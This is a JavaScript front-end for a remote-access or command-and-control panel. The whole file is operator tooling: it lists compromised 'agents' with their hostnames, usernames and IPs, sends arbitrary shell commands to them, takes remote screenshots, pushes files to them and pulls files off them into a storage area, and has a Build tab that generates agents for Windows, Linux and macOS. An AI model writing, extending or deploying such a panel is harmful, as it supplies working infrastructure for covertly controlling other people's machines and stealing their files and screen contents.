// Global variables
let currentAgent = null;
let commandHistory = [];
let historyIndex = -1;

// Transfer status management
const TRANSFER_STATUS_KEY = 'fileTransferStatus';

function saveTransferStatus(status) {
    localStorage.setItem(TRANSFER_STATUS_KEY, JSON.stringify({
        ...status,
        timestamp: Date.now()  // Add timestamp for expiry check
    }));
}

function getTransferStatus() {
    const status = localStorage.getItem(TRANSFER_STATUS_KEY);
    if (!status) return null;
    
    const parsedStatus = JSON.parse(status);
    
    // Check if status is older than 1 hour (3600000 ms)
    if (Date.now() - parsedStatus.timestamp > 3600000) {
        clearTransferStatus();
        return null;
    }
    
    return parsedStatus;
}

function clearTransferStatus() {
    localStorage.removeItem(TRANSFER_STATUS_KEY);
}

// Initialize when document loads
document.addEventListener('DOMContentLoaded', function() {
    // Check for ongoing transfer
    const transferStatus = getTransferStatus();
    if (transferStatus && transferStatus.inProgress) {
        // Wait a short moment for the agent tabs to be created
        setTimeout(() => {
            const { agentId, percent, status, operation } = transferStatus;
            if (document.getElementById(`progress-${agentId}`)) {
                showProgressBar(agentId, true, operation);
                updateProgressBar(agentId, percent || 0, status);
                
                // If it's an upload operation that was interrupted, clear the status
                if (operation && operation.type === 'upload') {
                    setTimeout(() => {
                        showProgressBar(agentId, false);
                        clearTransferStatus();
                        appendToTerminal('Upload interrupted by page refresh', 'error', agentId);
                    }, 1500);
                }
            } else {
                // If agent tab doesn't exist, clear the status
                clearTransferStatus();
            }
        }, 500);
    }

    // Initialize tabs
    const tabButtons = document.querySelectorAll('.tab-button');
    const tabPanes = document.querySelectorAll('.tab-pane');
    
    tabButtons.forEach(button => {
        button.addEventListener('click', () => {
            const tabName = button.getAttribute('data-tab');
            console.log('Switching to tab:', tabName);
            
            // Remove active class from all buttons and panes
            tabButtons.forEach(btn => btn.classList.remove('active'));
            tabPanes.forEach(pane => pane.classList.remove('active'));
            
            // Add active class to clicked button and corresponding pane
            button.classList.add('active');
            const targetPane = document.getElementById(`${tabName}-tab`);
            if (targetPane) {
                targetPane.classList.add('active');
                // Update content based on tab
                switch(tabName) {
                    case 'agents':
                        updateAgentsList();
                        break;
                    case 'command':
                        updateCommandCenter();
                        break;
                    case 'build':
                        initializeBuildPanel();
                        break;
                    case 'storage':
                        updateStorage();
                        break;
                }
            }
        });
    });

    // Start periodic updates for agents
    updateAgentsList();
    setInterval(updateAgentsList, 5000);
});

// Agents Tab Functions
function updateAgentsList() {
    fetch('/api/targets')
        .then(response => response.json())
        .then(agents => {
            const targetsList = document.getElementById('targets-list');
            if (!targetsList) return;

            if (agents.length === 0) {
                targetsList.innerHTML = `
                    <div class="no-agents">
                        <span class="material-icons">devices_off</span>
                        <p>No agents connected</p>
                    </div>`;
                return;
            }

            targetsList.innerHTML = agents.map(agent => `
                <div class="agent-item" data-id="${agent.id}">
                    <div class="agent-header">
                        <div class="status-badge ${isAgentActive(agent.last_seen) ? 'online' : 'offline'}"></div>
                        <div class="agent-name" onclick="editAlias(${agent.id}, '${agent.alias || `Agent_${agent.id}`}')">
                            <span>${agent.alias || `Agent_${agent.id}`}</span>
                            <span class="material-icons edit-icon">edit</span>
                        </div>
                        <div class="agent-os">${agent.os_type || 'Unknown'}</div>
                    </div>
                    <div class="agent-details">
                        <span><i class="material-icons">computer</i>${agent.hostname || 'Unknown'}</span>
                        <span><i class="material-icons">person</i>${agent.username || 'Unknown'}</span>
                        <span><i class="material-icons">router</i>${agent.ip}</span>
                    </div>
                    <div class="agent-actions">
                        <button onclick="event.stopPropagation(); commandAgent(${agent.id})" title="Command">
                            <span class="material-icons">terminal</span>
                        </button>
                        <button onclick="event.stopPropagation(); terminateAgent(${agent.id})" title="Terminate">
                            <span class="material-icons">power_settings_new</span>
                        </button>
                    </div>
                </div>
            `).join('');

            // Make entire agent item clickable
            const agentItems = targetsList.querySelectorAll('.agent-item');
            agentItems.forEach(item => {
                item.addEventListener('click', (e) => {
                    if (!e.target.closest('button') && !e.target.closest('.agent-name')) {
                        const agentId = parseInt(item.dataset.id);
                        commandAgent(agentId);
                    }
                });
            });
        });
}

// Command Center Functions
function updateCommandCenter() {
    fetch('/api/targets')
        .then(response => response.json())
        .then(agents => {
            const agentList = document.getElementById('agent-list');
            const tabsContainer = document.getElementById('agent-tabs');
            if (!agentList || !tabsContainer) return;

            // Sort agents by last seen
            agents.sort((a, b) => new Date(b.last_seen) - new Date(a.last_seen));

            // Update agent list
            agentList.innerHTML = agents.map(agent => `
                <div class="agent-card ${currentAgent === agent.id ? 'active' : ''}" 
                     onclick="selectAgent(${agent.id})">
                    <div class="agent-card-header">
                        <div class="status-badge ${isAgentActive(agent.last_seen) ? 'online' : 'offline'}"></div>
                        <div class="agent-info">
                            <div class="agent-name">${agent.alias || `Agent_${agent.id}`}</div>
                            <div class="agent-os">${agent.os_type || 'Unknown'}</div>
                        </div>
                    </div>
                </div>
            `).join('');

            // Only update or create tabs that don't exist yet
            agents.forEach(agent => {
                let agentTab = document.getElementById(`agent-tab-${agent.id}`);
                
                // If tab doesn't exist, create it
                if (!agentTab) {
                    const tabHTML = createAgentTab(agent.id, agent);
                    tabsContainer.insertAdjacentHTML('beforeend', tabHTML);
                    
                    // Initialize terminal input for new tab
                    const input = document.getElementById(`terminal-input-${agent.id}`);
                    if (input) {
                        input.addEventListener('keydown', function(e) {
                            handleTerminalHistory(e, agent.id);
                        });
                    }
                }
            });

            // Only remove tabs for agents that have been explicitly terminated
            const existingTabs = tabsContainer.querySelectorAll('.agent-tab');
            existingTabs.forEach(tab => {
                const tabId = parseInt(tab.id.replace('agent-tab-', ''));
                const agentExists = agents.some(agent => agent.id === tabId);
                if (!agentExists && tab.dataset.terminated === 'true') {
                    tab.remove();
                }
            });
        });
}

function createAgentTab(agentId, agentInfo) {
    const tabHTML = `
        <div id="agent-tab-${agentId}" class="agent-tab ${currentAgent === agentId ? 'active' : ''}" 
             style="display: ${currentAgent === agentId ? 'flex' : 'none'}">
            <div class="agent-tab-header">
                <div class="agent-info">
                    <span class="agent-name">${agentInfo.alias || `Agent_${agentId}`}</span>
                    <span class="agent-details">
                        ${agentInfo.os_type || 'Unknown'} | ${agentInfo.ip} | ${agentInfo.username}
                    </span>
                </div>
                <div class="agent-actions">
                    <button onclick="takeScreenshot(${agentId})" title="Take Screenshot">
                        <span class="material-icons">photo_camera</span>
                    </button>
                    <button onclick="uploadFile(${agentId})" title="Upload File">
                        <span class="material-icons">upload</span>
                    </button>
                    <button onclick="downloadFile(${agentId})" title="Download File">
                        <span class="material-icons">download</span>
                    </button>
                    <button onclick="terminateAgent(${agentId})" title="Terminate">
                        <span class="material-icons">power_settings_new</span>
                    </button>
                </div>
            </div>
            <div class="terminal-container">
                <div class="terminal-progress" id="progress-${agentId}">
                    <div class="progress-bar">
                        <div class="progress-fill"></div>
                    </div>
                    <div class="progress-text">0%</div>
                    <div class="progress-status">Transferring...</div>
                </div>
                <div class="terminal-output" id="terminal-output-${agentId}"></div>
                <div class="terminal-input-container">
                    <div class="terminal-input">
                        <span class="prompt">$</span>
                        <input type="text" 
                               class="terminal-input-field" 
                               id="terminal-input-${agentId}" 
                               placeholder="Enter command..."
                               onkeypress="handleCommand(event, ${agentId})">
                    </div>
                </div>
            </div>
        </div>
    `;
    return tabHTML;
}

function showProgressBar(agentId, show = true, operation = null) {
    const progressBar = document.getElementById(`progress-${agentId}`);
    if (progressBar) {
        if (show && operation) {
            saveTransferStatus({
                agentId: agentId,
                inProgress: true,
                operation: operation,
                percent: 0,
                status: operation.status
            });
        } else {
            clearTransferStatus();
        }
        progressBar.style.display = show ? 'block' : 'none';
    }
}

function updateProgressBar(agentId, percent, status = null) {
    const progressBar = document.getElementById(`progress-${agentId}`);
    if (!progressBar) return;

    const fill = progressBar.querySelector('.progress-fill');
    const text = progressBar.querySelector('.progress-text');
    const statusDiv = progressBar.querySelector('.progress-status');

    if (fill && text) {
        fill.style.width = `${percent}%`;
        text.textContent = `${percent.toFixed(1)}%`;
        if (status && statusDiv) {
            statusDiv.textContent = status;
        }

        // Save current progress
        const currentStatus = getTransferStatus();
        if (currentStatus && currentStatus.agentId === agentId) {
            saveTransferStatus({
                ...currentStatus,
                percent: percent,
                status: status || currentStatus.status
            });
        }
    }
}

// Build Tab Functions
function initializeBuildPanel() {
    const buildPanel = document.querySelector('.build-panel');
    buildPanel.innerHTML = `
        <h2>Build Agent</h2>
        <div class="build-options">
            <div class="option-group">
                <label>Platform</label>
                <select id="platform">
                    <option value="windows">Windows</option>
                    <option value="linux">Linux</option>
                    <option value="macos">MacOS</option>
                </select>
            </div>
            <div class="option-group">
                <label>Architecture</label>
                <select id="arch">
                    <option value="x64">x64</option>
                    <option value="x86">x86</option>
                </select>
            </div>
            <button onclick="buildAgent()" class="build-button">
                <span class="material-icons">build</span>
                Build Agent
            </button>
        </div>
        <div class="build-status"></div>
    `;
}

// Storage Tab Functions
function updateStorage() {
    fetch('/api/storage')
        .then(response => response.json())
        .then(data => {
            const storageContent = document.querySelector('.storage-content');
            storageContent.innerHTML = `
                <div class="storage-section">
                    <h3>Downloads</h3>
                    <div class="file-list" id="downloads-list">
                        ${renderFileList(data.downloads)}
                    </div>
                </div>
                <div class="storage-section">
                    <h3>Screenshots</h3>
                    <div class="file-list" id="screenshots-list">
                        ${renderFileList(data.screenshots)}
                    </div>
                </div>
            `;

            // Add event listeners for file actions
            addFileActionListeners();
        });
}

function renderFileList(files) {
    if (!files || files.length === 0) {
        return '<div class="no-files">No files found</div>';
    }

    return files.map(file => `
        <div class="file-item" data-path="${file.path}">
            <div class="file-info">
                <span class="file-name">
                    <span class="material-icons">description</span>
                    ${file.name}
                </span>
                <span class="file-size">${formatFileSize(file.size)}</span>
                <span class="file-date">${formatDate(file.modified)}</span>
            </div>
            <div class="file-actions">
                <button onclick="downloadStorageFile('${file.path}')" title="Download">
                    <span class="material-icons">download</span>
                </button>
                <button onclick="deleteFile('${file.path}')" title="Delete">
                    <span class="material-icons">delete</span>
                </button>
            </div>
        </div>
    `).join('');
}

function formatFileSize(bytes) {
    const units = ['B', 'KB', 'MB', 'GB'];
    let size = bytes;
    let unitIndex = 0;
    
    while (size >= 1024 && unitIndex < units.length - 1) {
        size /= 1024;
        unitIndex++;
    }
    
    return `${size.toFixed(1)} ${units[unitIndex]}`;
}

function formatDate(timestamp) {
    return new Date(timestamp * 1000).toLocaleString();
}

function downloadStorageFile(path) {
    // Create a temporary link to download the file
    const link = document.createElement('a');
    link.href = `/api/download_storage_file?path=${encodeURIComponent(path)}`;
    link.download = path.split('/').pop();
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

function deleteFile(path) {
    if (!confirm('Are you sure you want to delete this file?')) {
        return;
    }

    fetch('/api/delete_file', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ path: path })
    })
    .then(response => response.json())
    .then(data => {
        if (data.error) {
            alert(`Error deleting file: ${data.error}`);
        } else {
            // Refresh the storage view
            updateStorage();
        }
    })
    .catch(error => {
        alert(`Error: ${error}`);
    });
}

// Helper Functions
function isAgentActive(lastSeen) {
    const lastSeenDate = new Date(lastSeen);
    const now = new Date();
    return (now - lastSeenDate) < 30000; // 30 seconds
}

function commandAgent(agentId) {
    // Switch to command tab first
    document.querySelector('[data-tab="command"]').click();
    
    // Set current agent
    currentAgent = agentId;
    
    // Hide all agent tabs
    document.querySelectorAll('.agent-tab').forEach(tab => {
        tab.style.display = 'none';
    });
    
    // Show the selected agent's tab
    const agentTab = document.getElementById(`agent-tab-${agentId}`);
    if (agentTab) {
        agentTab.style.display = 'flex';
        // Focus on the terminal input
        const input = document.getElementById(`terminal-input-${agentId}`);
        if (input) {
            input.focus();
        }
    }
    
    // Update agent list to show active state
    document.querySelectorAll('.agent-card').forEach(card => {
        card.classList.toggle('active', card.getAttribute('onclick').includes(agentId));
    });
}

function selectAgent(agentId) {
    commandAgent(agentId);
}

// Command handling
document.addEventListener('DOMContentLoaded', function() {
    const terminalInput = document.getElementById('terminal-input');
    if (terminalInput) {
        terminalInput.addEventListener('keydown', function(e) {
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    this.value = commandHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex > -1) {
                    historyIndex--;
                    this.value = historyIndex >= 0 ? commandHistory[historyIndex] : '';
                }
            }
        });

        terminalInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                const command = this.value.trim();
                if (!command) return;
                
                if (!currentAgent) {
                    appendToTerminal('No agent selected', 'error');
                    return;
                }
                
                // Add command to history
                commandHistory.unshift(command);
                historyIndex = -1;
                
                // Show command in terminal
                appendToTerminal(`$ ${command}`, 'command');
                
                // Send command to server
                fetch('/api/send_command', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        session_id: currentAgent,
                        command: command
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.error) {
                        appendToTerminal(data.error, 'error');
                    } else {
                        // Handle different response types
                        if (typeof data.output === 'object') {
                            if (data.output.error) {
                                appendToTerminal(data.output.error, 'error');
                            } else if (data.output.output) {
                                appendToTerminal(data.output.output);
                            } else {
                                // Pretty print the object
                                const output = Object.entries(data.output)
                                    .map(([key, value]) => `${key}: ${value}`)
                                    .join('\n');
                                appendToTerminal(output);
                            }
                        } else {
                            appendToTerminal(data.output);
                        }
                    }
                })
                .catch(error => {
                    appendToTerminal(`Error: ${error.message}`, 'error');
                });
                
                this.value = '';
            }
        });
    }
});

function appendToTerminal(text, type = 'output') {
    const terminal = document.getElementById('terminal-output');
    if (!terminal) return;
    
    const div = document.createElement('div');
    div.className = `terminal-${type}`;
    
    // Handle multiline text
    if (typeof text === 'string') {
        text.split('\n').forEach((line, index) => {
            if (index > 0) {
                terminal.appendChild(document.createElement('br'));
            }
            div.textContent = line;
            terminal.appendChild(div.cloneNode(true));
        });
    } else {
        div.textContent = String(text);
        terminal.appendChild(div);
    }
    
    terminal.scrollTop = terminal.scrollHeight;
}

function editAlias(agentId, currentAlias) {
    const agentName = document.querySelector(`.agent-item[data-id="${agentId}"] .agent-name`);
    const currentName = currentAlias.startsWith('Agent_') ? '' : currentAlias;
    
    // Create input element
    const input = document.createElement('input');
    input.type = 'text';
    input.value = currentName;
    input.className = 'alias-input';
    input.placeholder = `Agent_${agentId}`;
    
    // Replace span with input
    agentName.innerHTML = '';
    agentName.appendChild(input);
    input.focus();
    
    // Handle input events
    input.addEventListener('blur', () => saveAlias(agentId, input.value));
    input.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            input.blur();
        }
    });
}

function saveAlias(agentId, newAlias) {
    fetch('/api/set_alias', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            session_id: agentId,
            alias: newAlias.trim() || `Agent_${agentId}`
        })
    })
    .then(response => response.json())
    .then(() => {
        // Refresh the agents list to show the new alias
        updateAgentsList();
    })
    .catch(error => console.error('Error saving alias:', error));
}

function terminateAgent(agentId) {
    if (!confirm('Are you sure you want to terminate this agent?')) {
        return;
    }

    // Mark the tab as terminated
    const agentTab = document.getElementById(`agent-tab-${agentId}`);
    if (agentTab) {
        agentTab.dataset.terminated = 'true';
    }

    // Send quit command to agent
    fetch('/api/send_command', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            session_id: agentId,
            command: 'quit'
        })
    })
    .then(response => response.json())
    .catch(() => {
        // If there's an error (no response), we still want to remove the agent
        console.log('No response from agent, forcing removal');
        return { force_remove: true };
    })
    .then((data) => {
        // Remove agent from UI whether we got a response or not
        removeAgentFromUI(agentId);
        
        // If we didn't get a response, force remove from server
        if (data.force_remove) {
            forceRemoveAgent(agentId);
        }
    })
    .catch(error => console.error('Error in termination process:', error));
}

function removeAgentFromUI(agentId) {
    // Remove from agents list
    const agentElement = document.querySelector(`.agent-item[data-id="${agentId}"]`);
    if (agentElement) {
        agentElement.remove();
    }
    
    // If this was the current agent in command center, clear it
    if (currentAgent === agentId) {
        currentAgent = null;
        const terminal = document.getElementById('terminal-output');
        if (terminal) {
            terminal.innerHTML = '<div class="terminal-error">Agent disconnected</div>';
        }
    }
    
    // Update command center agent list
    updateCommandCenter();
}

function forceRemoveAgent(agentId) {
    // Force remove from server
    fetch('/api/force_remove_agent', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            session_id: agentId
        })
    })
    .catch(error => console.error('Error forcing agent removal:', error));
}

function uploadFile(agentId) {
    const fileInput = document.createElement('input');
    fileInput.type = 'file';
    fileInput.onchange = async function() {
        const file = fileInput.files[0];
        if (!file) return;

        // Show upload status and progress bar
        appendToTerminal(`Uploading file: ${file.name}...`, 'info', agentId);
        showProgressBar(agentId, true, {
            type: 'upload',
            filename: file.name,
            status: `Uploading ${file.name}`
        });
        updateProgressBar(agentId, 0, `Uploading ${file.name}`);

        // Create FormData and append file
        const formData = new FormData();
        formData.append('file', file);
        formData.append('session_id', agentId);

        try {
            // Create XMLHttpRequest to track progress
            const xhr = new XMLHttpRequest();
            
            // Setup progress handler
            xhr.upload.onprogress = function(e) {
                if (e.lengthComputable) {
                    const percent = (e.loaded / e.total) * 100;
                    updateProgressBar(agentId, percent, `Uploading ${file.name}`);
                }
            };
            
            // Setup completion handler
            const uploadPromise = new Promise((resolve, reject) => {
                xhr.onload = function() {
                    if (xhr.status === 200) {
                        resolve(JSON.parse(xhr.responseText));
                    } else {
                        reject(new Error(xhr.responseText));
                    }
                };
                xhr.onerror = () => reject(new Error('Network error'));
            });

            // Send request
            xhr.open('POST', '/api/send_file');
            xhr.send(formData);

            // Wait for completion
            const data = await uploadPromise;
            
            // Hide progress bar and clear status
            showProgressBar(agentId, false);
            clearTransferStatus();

            if (data.success) {
                appendToTerminal(data.message, 'success', agentId);
            } else {
                throw new Error(data.error || 'Upload failed');
            }
        } catch (error) {
            showProgressBar(agentId, false);
            clearTransferStatus();
            appendToTerminal(`Upload failed: ${error.message}`, 'error', agentId);
        }
    };
    fileInput.click();
}

function downloadFile(agentId) {
    const filename = prompt('Enter the file path to download:');
    if (!filename) return;

    // Show download status and progress bar
    appendToTerminal(`Downloading file: ${filename}...`, 'info', agentId);
    showProgressBar(agentId, true, {
        type: 'download',
        filename: filename,
        status: `Downloading ${filename}`
    });
    updateProgressBar(agentId, 0, `Downloading ${filename}`);

    fetch('/api/download_file', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            session_id: agentId,
            filename: filename
        })
    })
    .then(response => {
        if (!response.ok) {
            return response.json().then(data => {
                throw new Error(data.error || 'Download failed');
            });
        }
        return response.json();
    })
    .then(data => {
        if (data.error) {
            throw new Error(data.error);
        }
        
        // Show 100% progress on success
        updateProgressBar(agentId, 100, `Downloaded ${filename}`);
        setTimeout(() => {
            showProgressBar(agentId, false);
            clearTransferStatus();
        }, 1000);
        
        appendToTerminal(data.message || data.output, 'success', agentId);
        if (data.path) {
            appendToTerminal(`File saved to: ${data.path}`, 'info', agentId);
            // Create a download link
            const link = document.createElement('a');
            link.href = `/download_storage_file?path=${encodeURIComponent(data.path)}`;
            link.download = filename.split('/').pop();
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
    })
    .catch(error => {
        showProgressBar(agentId, false);
        clearTransferStatus();
        appendToTerminal(`Download failed: ${error.message}`, 'error', agentId);
    });
}

function handleCommand(event, agentId) {
    if (event.key === 'Enter') {
        const input = document.getElementById(`terminal-input-${agentId}`);
        const command = input.value.trim();
        if (!command) return;

        // Add to history
        if (!commandHistory[agentId]) {
            commandHistory[agentId] = [];
        }
        commandHistory[agentId].unshift(command);
        historyIndex = -1;

        // Show command in terminal
        appendToTerminal(`$ ${command}`, 'command', agentId);

        // Handle file upload command separately
        if (command.startsWith('upload ')) {
            const filename = command.slice(7);
            const fileInput = document.createElement('input');
            fileInput.type = 'file';
            fileInput.onchange = function() {
                const file = fileInput.files[0];
                if (!file) return;
                
                const formData = new FormData();
                formData.append('file', file);
                formData.append('session_id', agentId);
                
                fetch('/api/send_file', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if (data.error) {
                        appendToTerminal(data.error, 'error', agentId);
                    } else {
                        appendToTerminal(data.message, 'success', agentId);
                    }
                })
                .catch(error => {
                    appendToTerminal(`Upload failed: ${error.message}`, 'error', agentId);
                });
            };
            fileInput.click();
            input.value = '';
            return;
        }

        // Send command
        fetch('/api/send_command', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                session_id: agentId,
                command: command
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.error) {
                appendToTerminal(data.error, 'error', agentId);
            } else {
                if (typeof data.output === 'object') {
                    if (data.output.error) {
                        appendToTerminal(data.output.error, 'error', agentId);
                    } else if (data.output.output) {
                        appendToTerminal(data.output.output, 'output', agentId);
                    } else {
                        const output = Object.entries(data.output)
                            .map(([key, value]) => `${key}: ${value}`)
                            .join('\n');
                        appendToTerminal(output, 'output', agentId);
                    }
                } else {
                    appendToTerminal(data.output, 'output', agentId);
                }
            }
        })
        .catch(error => {
            appendToTerminal(`Error: ${error.message}`, 'error', agentId);
        });

        input.value = '';
    }
}

function appendToTerminal(text, type = 'output', agentId) {
    const terminal = document.getElementById(`terminal-output-${agentId}`);
    if (!terminal) return;

    const div = document.createElement('div');
    div.className = `terminal-${type}`;

    if (typeof text === 'string') {
        text.split('\n').forEach((line, index) => {
            if (index > 0) {
                terminal.appendChild(document.createElement('br'));
            }
            div.textContent = line;
            terminal.appendChild(div.cloneNode(true));
        });
    } else {
        div.textContent = String(text);
        terminal.appendChild(div);
    }

    terminal.scrollTop = terminal.scrollHeight;
}

// Add this new function for screenshot functionality
function takeScreenshot(agentId) {
    appendToTerminal('Taking screenshot...', 'info', agentId);
    
    fetch('/api/send_command', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            session_id: agentId,
            command: 'screenshot'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.error) {
            appendToTerminal(data.error, 'error', agentId);
        } else {
            appendToTerminal(data.output, 'success', agentId);
            // Refresh storage view if we're on the storage tab
            if (document.querySelector('[data-tab="storage"]').classList.contains('active')) {
                updateStorage();
            }
        }
    })
    .catch(error => {
        appendToTerminal(`Error taking screenshot: ${error.message}`, 'error', agentId);
    });
} 